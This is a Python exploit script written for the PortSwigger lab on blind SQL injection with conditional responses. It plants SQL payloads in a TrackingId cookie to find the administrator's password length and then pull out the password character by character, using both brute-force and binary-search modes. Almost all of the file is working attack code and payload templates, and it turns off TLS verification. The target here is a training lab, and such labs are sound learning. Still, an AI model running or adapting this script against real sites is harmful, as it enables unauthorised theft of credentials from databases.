#!/usr/bin/env python3

import requests
#from requests.models import Response
import urllib3
from sys import argv
from urllib import parse
import string




'''
Comments

Mr12,

Morning if it's morning,
Evening if it's evening 

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

' and SELECT IF(ASCII(SUBSTRING('SQL Tutorial', 1, 1))>100, "yes",  False) --
BinarySearchPayload = " 'AND ( SELECT 'a' FROM users WHERE username='administrator' IF(LENGTH(password))>{NUM}, "yes",  False) ) --"
LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
crakPayload = 'AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter}


'''

# diable disable_warnings if thir is proxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ================================= Class ================================= #

class Request():
	crakPayload = "'AND (SELECT SUBSTRING(password,{indexOfletter},1) FROM users WHERE username='administrator')='{letter}"
	LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={passLength})='a"
	BinarySearchLengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{PasswordValue})='a"
	BinarySearchCrakPayload = "'AND (SELECT ASCII(SUBSTRING(password,{indexOfletter},1)) FROM users WHERE username='administrator'){operator}'{PasswordValue}"

	Wordlist = string.ascii_letters + string.digits
	
	def __init__(self, TargetUrl, proxies=None, cookies=None, lengthPayload=LengthPayload, crackPayload=crakPayload  ):
		self.TargetUrl = TargetUrl
		self.proxies = proxies
		self.cookies = cookies
		self.crakPayload = crackPayload
		self.LengthPayload = lengthPayload
		
	
	# return list [ text of respone , status coe ]
	# defualt value their is no cookies or proxies
	def sendRequest(self):
		try:
			result = requests.get(self.TargetUrl ,  proxies=self.proxies , cookies=self.cookies , verify=False )
			return [result.text, result.status_code]
		except:
			print("Error geting the request to ",self.TargetUrl)

	# search for word in response 
	def checkResponse(self , responseResult , word):
		if responseResult[1] == 200 :
			if word in responseResult[0]:
				#print("Found {0}".format(word))
				return True
			else:
				return False
		else:
			print("response code is: ",responseResult[1]) # print the response code if the respons is not 200

	# Url encode the payload 
	def encodePayload(self, payload):
		return parse.quote(payload)

	# normal brute force to find the password length
	def BruteForceFindLength(self, infectedCookieParameter, payload=LengthPayload, maxLength=50):
		# Get the correct cookie value
		infectedCookieValue = self.cookies.get(infectedCookieParameter , "")
		for i in range(1,maxLength+1): #  no zero password length , add 1 to reach the max pass length
			encodedPayload = self.encodePayload( payload.format(passLength=i) ) # test if pass length is equal to i
			self.cookies[infectedCookieParameter] = infectedCookieValue + encodedPayload #Edit the cookie to have the payload
			responseResult = self.sendRequest()

			# Check if it has the welcome basck word
			if self.checkResponse(responseResult, "Welcome back!"):
				print("Password Length is: ",i)
				return i
			else:
				print("Trying ",i,end="\r")
				


	def BruteForcePassword(self, passwordLength, infectedCookieParameter,  wordlist=Wordlist, payload=crakPayload ):
		crackedPasswod = []
		# Get the correct cookie value
		infectedCookieValue = self.cookies.get(infectedCookieParameter , "")
		for i in range(1,passwordLength+1): # To crack the last index
			for passValue in wordlist:
				# Edit the value of the cookie to set the payload in it
				encodedPayload = self.encodePayload( payload.format(indexOfletter=i,letter=passValue) ) # test if pass length is equal to i
				self.cookies[infectedCookieParameter] = infectedCookieValue + encodedPayload #Edit the cookie to have the payload
				responseResult = self.sendRequest()

				# Check if it has the welcome basck word
				if self.checkResponse(responseResult, "Welcome back!"):
					crackedPasswod.append(passValue)
					print("Index ",i,"is: ",passValue)
					break
				else:
					print("Trying ",passValue,end="\r")
		else:
			password = "".join(str(i) for i in crackedPasswod)
			return password

	# send request and see if "an word" is there , True if the word is in response
	def binarySearchSendReques(self, payload, infectedCookieParameter, infectedCookieValue ,operator, testValue, indexOfletter=None ):
		if indexOfletter: # if indexofLetter then it means we are cracking the pass
			self.cookies[infectedCookieParameter] = infectedCookieValue + self.encodePayload(payload.format(operator=operator,PasswordValue=testValue, indexOfletter=indexOfletter))
		else:
			self.cookies[infectedCookieParameter] = infectedCookieValue + self.encodePayload(payload.format(operator=operator,PasswordValue=testValue))
		responseResult = self.sendRequest()
		if self.checkResponse(responseResult, "Welcome back!"):
			return True
		else:
			return False
		
	def BinaryFindLength(self, InfectedCookieParameter , maxPasswordSize):
		infectedCookieValue = self.cookies.get(InfectedCookieParameter,"")
		# Make array of all posiable numbers
		passLengthRange = [ i for i in range(maxPasswordSize+1)]
		rangeLength = len(passLengthRange) - 1
		low , high = 0 , rangeLength
		while low <= high  :
			mid = low + (high - low) // 2
			# if the current mid equals password  
			if self.binarySearchSendReques( payload=self.BinarySearchLengthPayload, infectedCookieParameter=InfectedCookieParameter ,infectedCookieValue=infectedCookieValue, operator="=" , testValue=passLengthRange[mid] ) :
				print("Password length is ",passLengthRange[mid])
				return passLengthRange[mid]
			elif self.binarySearchSendReques( payload=self.BinarySearchLengthPayload , infectedCookieParameter=InfectedCookieParameter ,infectedCookieValue=infectedCookieValue, operator=">" , testValue=passLengthRange[mid] ) :
				low = mid + 1
				print("Password length is Bigger than ",passLengthRange[mid])
			else:
				high = mid - 1
				print("Password length less than ",passLengthRange[mid])
		return "Not Found in this Range"


	def BinaryCrackPassword(self,PasswordSize, InfectedCookieParameter ):
		infectedCookieValue = self.cookies.get(InfectedCookieParameter,"")
		passAsciiRange = [ i for i in range(128)]
		result = []
		for i in range(1,PasswordSize+1):
			low , high = 0 , 127
			while low <= high  :
				mid = low + (high - low) // 2
				if self.binarySearchSendReques(payload=self.BinarySearchCrakPayload, infectedCookieParameter=InfectedCookieParameter ,infectedCookieValue=infectedCookieValue, operator="=" , testValue=passAsciiRange[mid] , indexOfletter=i ) :
					print("Password Assic is ",passAsciiRange[mid])
					result.append(passAsciiRange[mid])
					break 
				elif self.binarySearchSendReques(payload=self.BinarySearchCrakPayload, infectedCookieParameter=InfectedCookieParameter ,infectedCookieValue=infectedCookieValue, operator=">" , testValue=passAsciiRange[mid] , indexOfletter=i ) :
					low = mid + 1
					print("Password Assic is Bigger than ",passAsciiRange[mid])
				else:
					high = mid - 1
					print("Password Assic length less than:",passAsciiRange[mid])
			print("################################# Done The {0} index ##################################".format(i))
		return result


# ================================= Class ================================= #




# ================================= Main ================================= #


if __name__ == '__main__' :

	help="Traget Url + options\n\n-binaryLength [ expected passLength ] \n-binaryCrack [passLength]\n-length [ Password Length ] To BruteForce Finding password length\n-crack [ password length ] edit the wordlist if you want"
	# You Must change it manually
	SiteCookies = {'TrackingId': '7MCkYBHEuTYqDjl4' , 'session':'F6Q9KI5uC2QcHV7GBa7gJ1dA7XfWdRYw'}
	#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
	numberOfArguments = len(argv)
	if numberOfArguments == 4: # start the script only if all argv are there 
		TargetUrl=argv[1]
	else:
		print(help)
		exit()
	
	targetSite = Request(TargetUrl=TargetUrl,cookies=SiteCookies)
	
	if argv[2] == "-length":
		Maxlength= int(argv[3]) # take the max password length 
		targetSite.BruteForceFindLength(infectedCookieParameter="TrackingId" ,maxLength=Maxlength)
	elif argv[2] == "-crack":
		PasswordLength = int(argv[3])
		Wordlist = string.ascii_letters + string.digits
		password = targetSite.BruteForcePassword(passwordLength=PasswordLength, infectedCookieParameter="TrackingId" , wordlist=Wordlist)
		print(password)
	elif argv[2] == "-binaryLength":
		maxPasswordLength = int(argv[3])
		PasswordLength = targetSite.BinaryFindLength(maxPasswordSize=maxPasswordLength, InfectedCookieParameter="TrackingId" )
		print(PasswordLength)
	elif argv[2] == "-binaryCrack":
		maxPasswordLength = int(argv[3])
		PasswordLength = targetSite.BinaryCrackPassword(PasswordSize=maxPasswordLength, InfectedCookieParameter="TrackingId" )
		for i in PasswordLength:
			print(chr(i),end="")
	else:
		print(help)
	
